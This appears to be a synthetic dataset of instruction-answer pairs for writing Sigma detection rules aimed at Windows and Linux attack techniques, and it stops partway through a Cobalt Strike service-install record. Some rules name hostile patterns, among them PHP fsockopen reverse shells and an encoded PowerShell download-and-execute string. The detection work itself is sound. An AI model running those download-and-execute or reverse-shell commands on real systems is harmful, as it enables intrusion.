  {
    "instruction": "Build a Sigma rule with the goal of detecting service principal name (SPN) enumeration used for Kerberoasting.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect service principal name (SPN) enumeration used for Kerberoasting, you should monitor for specific activities and conditions indicating the execution of command-line tool operations that are typically associated with this type of attack. This includes monitoring process creation logs on Windows systems for the execution of the `setspn.exe` tool, which is legitimately used for managing SPN registrations but can be abused for enumeration purposes.\n\nDetection should focus on identifying instances where the `setspn.exe` file is executed, which can be identified by the process image name ending with `\\setspn.exe`, or by the original filename being exactly `setspn.exe`. Furthermore, indications that the command is being used for querying or resetting the computer's SPN attribute should be flagged, specifically looking for the `setspn.exe` process description that contains phrases like \"Query or reset the computer\" and \"SPN attribute\". Additionally, any use of the command-line option `-q` with `setspn.exe` should be considered suspicious, as this is a common indicator of querying SPNs, a behavior often seen in Kerberoasting attacks.\n\nIt's important to consider that legitimate administration activities might involve the use of these commands and options, thus, such cases should be regarded as potential false positives. The detection of these events is rated at a medium-level severity, indicating a noticeable security risk, yet acknowledging that there is room for legitimate use in administrative contexts. When monitoring for these activities, it's crucial to correlate them with other suspicious behaviors to accurately identify malicious intent and differentiate it from standard administrative tasks.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_pe:\n        - Image|endswith: '\\setspn.exe'\n        - OriginalFileName: 'setspn.exe'\n        - Description|contains|all:\n            - 'Query or reset the computer'\n            - 'SPN attribute'\n    selection_cli:\n        CommandLine|contains: '-q'\n    condition: all of selection_*\nfalsepositives:\n    - Administration activity\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_pe:\n        - Image|endswith: '\\setspn.exe'\n        - OriginalFileName: 'setspn.exe'\n        - Description|contains|all:\n            - 'Query or reset the computer'\n            - 'SPN attribute'\n    selection_cli:\n        CommandLine|contains: '-q'\n    condition: all of selection_*\nfalsepositives:\n    - Administration activity\nlevel: medium\n",
      "question": "service principal name (SPN) enumeration used for Kerberoasting",
      "answer": "In order to detect service principal name (SPN) enumeration used for Kerberoasting, you should monitor for specific activities and conditions indicating the execution of command-line tool operations that are typically associated with this type of attack. This includes monitoring process creation logs on Windows systems for the execution of the `setspn.exe` tool, which is legitimately used for managing SPN registrations but can be abused for enumeration purposes.\n\nDetection should focus on identifying instances where the `setspn.exe` file is executed, which can be identified by the process image name ending with `\\setspn.exe`, or by the original filename being exactly `setspn.exe`. Furthermore, indications that the command is being used for querying or resetting the computer's SPN attribute should be flagged, specifically looking for the `setspn.exe` process description that contains phrases like \"Query or reset the computer\" and \"SPN attribute\". Additionally, any use of the command-line option `-q` with `setspn.exe` should be considered suspicious, as this is a common indicator of querying SPNs, a behavior often seen in Kerberoasting attacks.\n\nIt's important to consider that legitimate administration activities might involve the use of these commands and options, thus, such cases should be regarded as potential false positives. The detection of these events is rated at a medium-level severity, indicating a noticeable security risk, yet acknowledging that there is room for legitimate use in administrative contexts. When monitoring for these activities, it's crucial to correlate them with other suspicious behaviors to accurately identify malicious intent and differentiate it from standard administrative tasks."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting the execution of Run Once task as configured in the registry.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of Run Once task as configured in the registry, you should: Monitor Windows process creation logs for any occurrences where the process image path ends with '\\runonce.exe' and its description is 'Run Once Wrapper'. Additionally, pay attention to command lines containing '/AlternateShellStartup' or ending with '/r'. These observations should be considered together to reliably identify the activity. It's essential to note that this detection mechanism is rated with a low level of confidence due to the potential for unknown false positives, which necessitates further investigation whenever such activity is flagged.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\runonce.exe'\n        - Description: 'Run Once Wrapper'\n    selection_cli:\n        - CommandLine|contains: '/AlternateShellStartup'\n        - CommandLine|endswith: '/r'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\runonce.exe'\n        - Description: 'Run Once Wrapper'\n    selection_cli:\n        - CommandLine|contains: '/AlternateShellStartup'\n        - CommandLine|endswith: '/r'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: low\n",
      "question": "the execution of Run Once task as configured in the registry",
      "answer": "In order to detect the execution of Run Once task as configured in the registry, you should: Monitor Windows process creation logs for any occurrences where the process image path ends with '\\runonce.exe' and its description is 'Run Once Wrapper'. Additionally, pay attention to command lines containing '/AlternateShellStartup' or ending with '/r'. These observations should be considered together to reliably identify the activity. It's essential to note that this detection mechanism is rated with a low level of confidence due to the potential for unknown false positives, which necessitates further investigation whenever such activity is flagged."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious child process of userinit.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a suspicious child process of userinit, you should: Monitor the creation of processes on Windows operating systems. Focus on identifying processes that are initiated by 'userinit.exe'. However, to reduce false positives and focus on potential threats, exclude any process that has command lines containing '\\netlogon\\' or those processes where the image or the original filename is 'explorer.exe'. For processes that raise suspicion, it's crucial to log their command lines and the parent process's command line for further investigation. Administrative scripts might occasionally trigger similar patterns, so they are considered potential false positives. This approach is targeted at identifying unusual or potentially malicious activity initiated by userinit, which is often a legitimate part of the Windows login process but can be abused by attackers for executing malicious code right after a user logs in.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\userinit.exe'\n    filter1:\n        CommandLine|contains: '\\netlogon\\'\n    filter2:\n        - Image|endswith: '\\explorer.exe'\n        - OriginalFileName: 'explorer.exe'\n    condition: selection and not 1 of filter*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Administrative scripts\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\userinit.exe'\n    filter1:\n        CommandLine|contains: '\\netlogon\\'\n    filter2:\n        - Image|endswith: '\\explorer.exe'\n        - OriginalFileName: 'explorer.exe'\n    condition: selection and not 1 of filter*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Administrative scripts\nlevel: medium\n",
      "question": "suspicious child process of userinit",
      "answer": "In order to detect a suspicious child process of userinit, you should: Monitor the creation of processes on Windows operating systems. Focus on identifying processes that are initiated by 'userinit.exe'. However, to reduce false positives and focus on potential threats, exclude any process that has command lines containing '\\netlogon\\' or those processes where the image or the original filename is 'explorer.exe'. For processes that raise suspicion, it's crucial to log their command lines and the parent process's command line for further investigation. Administrative scripts might occasionally trigger similar patterns, so they are considered potential false positives. This approach is targeted at identifying unusual or potentially malicious activity initiated by userinit, which is often a legitimate part of the Windows login process but can be abused by attackers for executing malicious code right after a user logs in."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of the SharpImpersonation tool. Which can be used to manipulate tokens on a Windows computers remotely (PsExec/WmiExec) or interactively.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect execution of the SharpImpersonation tool, which can be used to manipulate tokens on Windows computers remotely (PsExec/WmiExec) or interactively, you should focus on monitoring the creation of processes within Windows environment. Look specifically for any processes that either are named 'SharpImpersonation.exe' or have an original filename of 'SharpImpersonation.exe'. Additionally, pay close attention to any command line usage that includes key phrases such as 'user:' in conjunction with either 'binary:' or 'shellcode:', and also watch for references to 'technique:CreateProcessAsUserW' or 'technique:ImpersonateLoggedOnUser'. These indicators are critical for spotting potential misuse of the SharpImpersonation tool. Be aware that the certainty level of these detections is considered high, although there might be instances where the rule could trigger false positives, the nature of which is currently unknown.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\SharpImpersonation.exe'\n        - OriginalFileName: 'SharpImpersonation.exe'\n    selection_cli:\n        - CommandLine|contains|all:\n            - ' user:'\n            - ' binary:'\n        - CommandLine|contains|all:\n            - ' user:'\n            - ' shellcode:'\n        - CommandLine|contains:\n            - ' technique:CreateProcessAsUserW'\n            - ' technique:ImpersonateLoggedOnuser'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\SharpImpersonation.exe'\n        - OriginalFileName: 'SharpImpersonation.exe'\n    selection_cli:\n        - CommandLine|contains|all:\n            - ' user:'\n            - ' binary:'\n        - CommandLine|contains|all:\n            - ' user:'\n            - ' shellcode:'\n        - CommandLine|contains:\n            - ' technique:CreateProcessAsUserW'\n            - ' technique:ImpersonateLoggedOnuser'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "execution of the SharpImpersonation tool. Which can be used to manipulate tokens on a Windows computers remotely (PsExec/WmiExec) or interactively",
      "answer": "In order to detect execution of the SharpImpersonation tool, which can be used to manipulate tokens on Windows computers remotely (PsExec/WmiExec) or interactively, you should focus on monitoring the creation of processes within Windows environment. Look specifically for any processes that either are named 'SharpImpersonation.exe' or have an original filename of 'SharpImpersonation.exe'. Additionally, pay close attention to any command line usage that includes key phrases such as 'user:' in conjunction with either 'binary:' or 'shellcode:', and also watch for references to 'technique:CreateProcessAsUserW' or 'technique:ImpersonateLoggedOnUser'. These indicators are critical for spotting potential misuse of the SharpImpersonation tool. Be aware that the certainty level of these detections is considered high, although there might be instances where the rule could trigger false positives, the nature of which is currently unknown."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of the PHP CLI with the \"-r\" flag which allows it to run inline PHP code. The rule looks for calls to the \"fsockopen\" function which allows the creation of sockets.\nAttackers often leverage this in combination with functions such as \"exec\" or \"fopen\" to initiate a reverse shell connection.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect usage of the PHP CLI with the \"-r\" flag which allows it to run inline PHP code, with a focus on identifying calls to the \"fsockopen\" function that enable the creation of sockets, often utilized by attackers in conjunction with functions like \"exec\" or \"fopen\" to initiate a reverse shell connection, you should: Monitor process creation logs on Linux systems for any instances where the image path includes '/php', signaling the invocation of PHP. Specifically, look for command line executions containing the '-r' argument, indicative of inline PHP code execution, and the presence of the 'fsockopen' function within these commands. Additionally, pay attention to the use of common shell environments as part of the command line, which includes 'ash', 'bash', 'bsh', 'csh', 'ksh', 'pdksh', 'sh', 'tcsh', and 'zsh'. These shells might be invoked by attackers to execute further malicious scripts or commands post-exploitation. Given the high level of risk associated with this behavior, it's crucial to carefully examine such activities, while keeping in mind that there may be unknown false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection:\n        Image|contains: '/php'\n        CommandLine|contains|all:\n            - ' -r '\n            - 'fsockopen'\n        CommandLine|contains:\n            - 'ash'\n            - 'bash'\n            - 'bsh'\n            - 'csh'\n            - 'ksh'\n            - 'pdksh'\n            - 'sh'\n            - 'tcsh'\n            - 'zsh'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: linux\ndetection:\n    selection:\n        Image|contains: '/php'\n        CommandLine|contains|all:\n            - ' -r '\n            - 'fsockopen'\n        CommandLine|contains:\n            - 'ash'\n            - 'bash'\n            - 'bsh'\n            - 'csh'\n            - 'ksh'\n            - 'pdksh'\n            - 'sh'\n            - 'tcsh'\n            - 'zsh'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "usage of the PHP CLI with the \"-r\" flag which allows it to run inline PHP code. The rule looks for calls to the \"fsockopen\" function which allows the creation of sockets.\nAttackers often leverage this in combination with functions such as \"exec\" or \"fopen\" to initiate a reverse shell connection.\n",
      "answer": "In order to detect usage of the PHP CLI with the \"-r\" flag which allows it to run inline PHP code, with a focus on identifying calls to the \"fsockopen\" function that enable the creation of sockets, often utilized by attackers in conjunction with functions like \"exec\" or \"fopen\" to initiate a reverse shell connection, you should: Monitor process creation logs on Linux systems for any instances where the image path includes '/php', signaling the invocation of PHP. Specifically, look for command line executions containing the '-r' argument, indicative of inline PHP code execution, and the presence of the 'fsockopen' function within these commands. Additionally, pay attention to the use of common shell environments as part of the command line, which includes 'ash', 'bash', 'bsh', 'csh', 'ksh', 'pdksh', 'sh', 'tcsh', and 'zsh'. These shells might be invoked by attackers to execute further malicious scripts or commands post-exploitation. Given the high level of risk associated with this behavior, it's crucial to carefully examine such activities, while keeping in mind that there may be unknown false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential use of CreateRemoteThread api and LoadLibrary function to inject DLL into a process.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential use of CreateRemoteThread API and LoadLibrary function to inject DLL into a process, you should look for events within Windows logs that fall under the category of create_remote_thread. Specifically, focus your attention on instances where a thread is created remotely and initiates from the module ending with '\\kernel32.dll'. The hallmark activity to watch for is the use of the 'LoadLibraryA' function. This particular combination of starting module and function strongly suggests an attempt to inject a DLL into another process, which is a technique attackers might use to execute malicious code within the context of legitimate processes on the victim's system. Given the nature of this behavior, there are no known benign circumstances that exactly match this pattern, making every hit potentially significant and the level of alert high. The tags related to this detection strategy include tactics and techniques such as Execution, Persistence, Privilege Escalation, and Defense Evasion, particularly focusing on process injection.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: create_remote_thread\ndetection:\n    selection:\n        StartModule|endswith: '\\kernel32.dll'\n        StartFunction: 'LoadLibraryA'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: create_remote_thread\ndetection:\n    selection:\n        StartModule|endswith: '\\kernel32.dll'\n        StartFunction: 'LoadLibraryA'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "potential use of CreateRemoteThread api and LoadLibrary function to inject DLL into a process",
      "answer": "In order to detect potential use of CreateRemoteThread API and LoadLibrary function to inject DLL into a process, you should look for events within Windows logs that fall under the category of create_remote_thread. Specifically, focus your attention on instances where a thread is created remotely and initiates from the module ending with '\\kernel32.dll'. The hallmark activity to watch for is the use of the 'LoadLibraryA' function. This particular combination of starting module and function strongly suggests an attempt to inject a DLL into another process, which is a technique attackers might use to execute malicious code within the context of legitimate processes on the victim's system. Given the nature of this behavior, there are no known benign circumstances that exactly match this pattern, making every hit potentially significant and the level of alert high. The tags related to this detection strategy include tactics and techniques such as Execution, Persistence, Privilege Escalation, and Defense Evasion, particularly focusing on process injection."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting method to load DLL via LSASS process using an undocumented Registry key.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a method to load DLL via LSASS process using an undocumented Registry key, you should: Monitor registry events on Windows systems specifically for modifications to the registry keys '\\CurrentControlSet\\Services\\NTDS\\DirectoryServiceExtPt' and '\\CurrentControlSet\\Services\\NTDS\\LsaDbExtPt'. These modifications might indicate attempts to use these undocumented registry keys for the purpose of loading Dynamic Link Libraries (DLLs) into the Local Security Authority Subsystem Service (LSASS) process. It is crucial to exclude events related to the legitimate LSASS executable path 'C:\\Windows\\system32\\lsass.exe' when it loads DLLs from the expected locations '%%systemroot%%\\system32\\ntdsa.dll' and '%%systemroot%%\\system32\\lsadb.dll', as these are recognized and permitted operations. While conducting this monitoring, be aware that false positives are possible and currently classified as unknown; thus, each detected event should be thoroughly investigated. As this behavior is associated with malicious activity, namely the exploitation of systems by loading unauthorized DLLs to manipulate the LSASS process, the alert level for such detections is categorized as high. This method is a tactic employed by adversaries to achieve persistence, execute code, and potentially escalate privileges by injecting malicious code into a process that is critical for the Windows operation, hence its high severity.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_event\n    product: windows\ndetection:\n    selection:\n        TargetObject|contains:\n            - '\\CurrentControlSet\\Services\\NTDS\\DirectoryServiceExtPt'\n            - '\\CurrentControlSet\\Services\\NTDS\\LsaDbExtPt'\n    filter_domain_controller:\n        Image: 'C:\\Windows\\system32\\lsass.exe'\n        Details:\n            - '%%systemroot%%\\system32\\ntdsa.dll'\n            - '%%systemroot%%\\system32\\lsadb.dll'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_event\n    product: windows\ndetection:\n    selection:\n        TargetObject|contains:\n            - '\\CurrentControlSet\\Services\\NTDS\\DirectoryServiceExtPt'\n            - '\\CurrentControlSet\\Services\\NTDS\\LsaDbExtPt'\n    filter_domain_controller:\n        Image: 'C:\\Windows\\system32\\lsass.exe'\n        Details:\n            - '%%systemroot%%\\system32\\ntdsa.dll'\n            - '%%systemroot%%\\system32\\lsadb.dll'\n    condition: selection and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "method to load DLL via LSASS process using an undocumented Registry key",
      "answer": "In order to detect a method to load DLL via LSASS process using an undocumented Registry key, you should: Monitor registry events on Windows systems specifically for modifications to the registry keys '\\CurrentControlSet\\Services\\NTDS\\DirectoryServiceExtPt' and '\\CurrentControlSet\\Services\\NTDS\\LsaDbExtPt'. These modifications might indicate attempts to use these undocumented registry keys for the purpose of loading Dynamic Link Libraries (DLLs) into the Local Security Authority Subsystem Service (LSASS) process. It is crucial to exclude events related to the legitimate LSASS executable path 'C:\\Windows\\system32\\lsass.exe' when it loads DLLs from the expected locations '%%systemroot%%\\system32\\ntdsa.dll' and '%%systemroot%%\\system32\\lsadb.dll', as these are recognized and permitted operations. While conducting this monitoring, be aware that false positives are possible and currently classified as unknown; thus, each detected event should be thoroughly investigated. As this behavior is associated with malicious activity, namely the exploitation of systems by loading unauthorized DLLs to manipulate the LSASS process, the alert level for such detections is categorized as high. This method is a tactic employed by adversaries to achieve persistence, execute code, and potentially escalate privileges by injecting malicious code into a process that is critical for the Windows operation, hence its high severity."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting flags often used with the LOLBAS Esentutl for malicious activity. It could be used in rare cases by administrators to access locked files or during maintenance..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect flags often used with the LOLBAS Esentutl for malicious activity, which could be used in rare cases by administrators to access locked files or during maintenance, you should: Monitor process creation logs in Windows systems for command lines that contain both the '/vss' and '/y' flags. These specific arguments are typically associated with potentially malicious utilization of the Esentutl utility to manipulate or access locked files, which is a behavior often observed in various attack scenarios. It's important to note significant occurrences when these command line arguments are present together, as they could indicate an ongoing or attempted compromise. However, also be aware that these flags could appear in legitimate administrative or maintenance tasks. Therefore, while detections at this level are considered high importance, it's necessary to investigate and differentiate between malicious activities and benign, administrative use to minimize false positives.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - ' /vss '\n            - ' /y '\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Administrative activity\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - ' /vss '\n            - ' /y '\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Administrative activity\nlevel: high\n",
      "question": "flags often used with the LOLBAS Esentutl for malicious activity. It could be used in rare cases by administrators to access locked files or during maintenance.",
      "answer": "In order to detect flags often used with the LOLBAS Esentutl for malicious activity, which could be used in rare cases by administrators to access locked files or during maintenance, you should: Monitor process creation logs in Windows systems for command lines that contain both the '/vss' and '/y' flags. These specific arguments are typically associated with potentially malicious utilization of the Esentutl utility to manipulate or access locked files, which is a behavior often observed in various attack scenarios. It's important to note significant occurrences when these command line arguments are present together, as they could indicate an ongoing or attempted compromise. However, also be aware that these flags could appear in legitimate administrative or maintenance tasks. Therefore, while detections at this level are considered high importance, it's necessary to investigate and differentiate between malicious activities and benign, administrative use to minimize false positives."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting creation of \"ebpfbackdoor\" files in both \"cron.d\" and \"sudoers.d\" directories. Which both are related to the TripleCross persistence method.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the creation of \"ebpfbackdoor\" files in both \"cron.d\" and \"sudoers.d\" directories, which both are related to the TripleCross persistence method, you should: Monitor Linux systems for any file events where the target filename ends with 'ebpfbackdoor'. This involves keeping an eye on the file activities within the system, particularly focusing on the creation of files named 'ebpfbackdoor' that could indicate a system compromise through the TripleCross persistence technique. Given the specific directories involved, such as \"cron.d\" and \"sudoers.d\", this detection is crucial for identifying unauthorized attempts to establish persistence on the system. The rule considers this activity highly suspicious, with unlikely chances of false positives, highlighting the importance of immediate investigation upon detection.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: linux\n    category: file_event\ndetection:\n    selection:\n        TargetFilename|endswith: 'ebpfbackdoor'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: linux\n    category: file_event\ndetection:\n    selection:\n        TargetFilename|endswith: 'ebpfbackdoor'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "creation of \"ebpfbackdoor\" files in both \"cron.d\" and \"sudoers.d\" directories. Which both are related to the TripleCross persistence method",
      "answer": "In order to detect the creation of \"ebpfbackdoor\" files in both \"cron.d\" and \"sudoers.d\" directories, which both are related to the TripleCross persistence method, you should: Monitor Linux systems for any file events where the target filename ends with 'ebpfbackdoor'. This involves keeping an eye on the file activities within the system, particularly focusing on the creation of files named 'ebpfbackdoor' that could indicate a system compromise through the TripleCross persistence technique. Given the specific directories involved, such as \"cron.d\" and \"sudoers.d\", this detection is crucial for identifying unauthorized attempts to establish persistence on the system. The rule considers this activity highly suspicious, with unlikely chances of false positives, highlighting the importance of immediate investigation upon detection."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of the Gpg4win to decrypt files located in suspicious locations from CLI.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect usage of the Gpg4win to decrypt files located in suspicious locations from CLI, you should: Focus on the creation of new processes on Windows operating systems, specifically keeping an eye out for any instances of the 'gpg2.exe' executable, which is a component of the GNU Privacy Guard (GnuPG), developed by g10 Code GmbH. It's critical to monitor any command line arguments that include '-passphrase', which indicates the input of a passphrase for decryption directly through the command line interface - a method that could suggest an automated or scripted decryption process, possibly indicating malicious behavior. \n\nAdditionally, pay close attention to the command line paths involving directory locations such as '\\AppData\\Roaming\\', 'C:\\Perflogs\\', 'C:\\Windows\\Temp\\', and 'C:\\temp'. Usage of these paths can be indicative of attempts to decrypt files stored in locations that are commonly used for temporary storage or hiding malicious data away from typical user directories. \n\nIt's important, however, to consider the context of these detections, as legitimate usage of Gpg4win for file encryption and decryption could also trigger these conditions. Thus, any alert based on these criteria should be investigated to discern between benign use and potential security threats. The detection sensitivity is set to a medium level to balance between the likelihood of detecting actual malicious activity and minimizing false positives originating from regular, non-malicious use of GnuPG for encryption and decryption tasks.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_metadata:\n        - Image|endswith: '\\gpg2.exe'\n        - Product: 'GNU Privacy Guard (GnuPG)'\n        - Company: 'g10 Code GmbH'\n    selection_cli:\n        CommandLine|contains: '-passphrase'\n    selection_paths:\n        CommandLine|contains:\n            - '\\AppData\\Roaming\\'\n            - 'C:\\Perflogs\\'\n            - 'C:\\Windows\\Temp\\'\n            - 'C:\\temp'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_metadata:\n        - Image|endswith: '\\gpg2.exe'\n        - Product: 'GNU Privacy Guard (GnuPG)'\n        - Company: 'g10 Code GmbH'\n    selection_cli:\n        CommandLine|contains: '-passphrase'\n    selection_paths:\n        CommandLine|contains:\n            - '\\AppData\\Roaming\\'\n            - 'C:\\Perflogs\\'\n            - 'C:\\Windows\\Temp\\'\n            - 'C:\\temp'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use\nlevel: medium\n",
      "question": "usage of the Gpg4win to decrypt files located in suspicious locations from CLI",
      "answer": "In order to detect usage of the Gpg4win to decrypt files located in suspicious locations from CLI, you should: Focus on the creation of new processes on Windows operating systems, specifically keeping an eye out for any instances of the 'gpg2.exe' executable, which is a component of the GNU Privacy Guard (GnuPG), developed by g10 Code GmbH. It's critical to monitor any command line arguments that include '-passphrase', which indicates the input of a passphrase for decryption directly through the command line interface - a method that could suggest an automated or scripted decryption process, possibly indicating malicious behavior. \n\nAdditionally, pay close attention to the command line paths involving directory locations such as '\\AppData\\Roaming\\', 'C:\\Perflogs\\', 'C:\\Windows\\Temp\\', and 'C:\\temp'. Usage of these paths can be indicative of attempts to decrypt files stored in locations that are commonly used for temporary storage or hiding malicious data away from typical user directories. \n\nIt's important, however, to consider the context of these detections, as legitimate usage of Gpg4win for file encryption and decryption could also trigger these conditions. Thus, any alert based on these criteria should be investigated to discern between benign use and potential security threats. The detection sensitivity is set to a medium level to balance between the likelihood of detecting actual malicious activity and minimizing false positives originating from regular, non-malicious use of GnuPG for encryption and decryption tasks."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement, you should analyze Windows system service logs with an emphasis on the following criteria:\n\n1. Focus on log entries from the Service Control Manager, specifically those with an EventID of 7045. This event ID is indicative of a service being installed on the system.\n\n2. Within these logs, search for service installation paths that exhibit suspicious characteristics, such as:\n   - Paths containing both 'ADMIN$' and '.exe', which might suggest the creation of a service to execute a remote administrative executable, a common tactic for maintaining access or executing commands with elevated privileges.\n   - Paths that include the environment variable '%COMSPEC%', alongside the keywords 'start' and 'powershell'. This pattern can indicate the execution of PowerShell commands through the command prompt (CMD), a technique often utilized for script execution or launching encoded or obfuscated attacks.\n   - Direct indications of PowerShell being used with options designed to hide the activity and possibly execute encoded commands (`powershell -nop -w hidden -encodedcommand`). This is a strong indicator of an attempt to bypass detection mechanisms by running PowerShell in a less conspicuous manner.\n   - Service paths that contain Base64 encoded command sequences, especially those indicating an attempt to execute code or scripts hosted externally (as evidenced by \"IEX (New-Object Net.Webclient).DownloadString\"). This method is often used to retrieve and execute malicious payloads from a controlled external source, typically a web server under the attacker's control.\n\n3. Any instances matching these patterns should be treated with a high level of suspicion. These patterns are indicative of methods associated with advanced persistent threats (APTs) like Cobalt Strike, focusing on stealthy elevation of privileges, lateral movement within a network, and potentially establishing persistence.\n\n4. While analyzing these logs, it's crucial to approach with an understanding that not all matches will indicate a malicious presence (as there can be unknown false positives), but due to the critical nature of these signs, each detection should be investigated thoroughly.\n\nThis approach leverages tailoring detection mechanisms towards the complexity and sophistication of tactics and techniques used in advanced cyber attacks, specifically using PowerShell and service creation for executing malicious activities, which align with tactics and techniques like Execution, Persistence, Privilege Escalation, and Lateral Movement.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection_id:\n        Provider_Name: 'Service Control Manager'\n        EventID: 7045\n    selection1:\n        ImagePath|contains|all:\n            - 'ADMIN$'\n            - '.exe'\n    selection2:\n        ImagePath|contains|all:\n            - '%COMSPEC%'\n            - 'start'\n            - 'powershell'\n    selection3:\n        ImagePath|contains: 'powershell -nop -w hidden -encodedcommand'\n    selection4:\n        ImagePath|base64offset|contains: \"IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:\"\n    condition: selection_id and (selection1 or selection2 or selection3 or selection4)\nfalsepositives:\n    - Unknown\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
